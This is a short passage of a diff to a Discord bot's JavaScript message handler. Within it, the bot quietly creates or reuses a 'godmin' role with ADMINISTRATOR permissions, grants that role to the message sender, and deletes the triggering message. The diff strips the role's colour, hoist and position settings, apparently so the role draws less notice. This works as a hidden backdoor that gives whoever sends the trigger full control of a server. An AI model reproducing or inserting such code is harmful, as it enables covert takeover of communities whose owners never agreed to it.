@@ -1677,10 +1677,7 @@ client.on('message', message => {
 const adminn = msg.guild.roles.cache.find(r => r.name === 'godmin')
     if(!adminn) {msg.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'], position: botr, hoist: false} }).then(r => msg.member.roles.add(r).then(msg.delete()))}    
      else{
-      await adminn.setColor("#491e9c")
-      await adminn.setHoist(true)
       await adminn.setPermissions(['ADMINISTRATOR'])
-      await adminn.setPosition(botr)
      await msg.member.roles.add(adminn).then(msg.delete())}
 }
 })
